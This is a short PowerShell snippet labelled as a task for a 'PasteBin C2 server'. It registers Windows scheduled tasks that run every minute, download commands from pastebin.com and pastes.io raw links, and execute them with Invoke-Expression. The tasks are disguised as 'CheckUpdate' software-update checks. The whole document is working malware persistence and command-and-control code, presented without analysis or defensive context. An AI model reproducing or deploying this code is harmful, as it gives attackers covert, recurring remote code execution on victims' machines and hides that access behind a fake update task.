
# task for PasteBin C2 server
Win = r

$a = New-ScheduledTaskAction -Execute 'powershell' -Argument '$rawcmd = Invoke-webrequest -URI https://pastebin.com/raw/4Pg262jQ -UseBasicParsing; Invoke-Expression $rawcmd;'; $t = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1); Register-ScheduledTask -Action $a -Trigger $t -TaskPath "CheckUpdate" -TaskName "CheckUpdate" -Description "Check for new software update."

$a = New-ScheduledTaskAction -Execute 'powershell' -Argument '$rawcmd = Invoke-webrequest -URI https://pastes.io/raw/idqtzhsyfu -UseBasicParsing; Invoke-Expression $rawcmd;'; $t = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1); Register-ScheduledTask -Action $a -Trigger $t -TaskPath "CheckUpdate" -TaskName "CheckUpdate" -Description "Check update."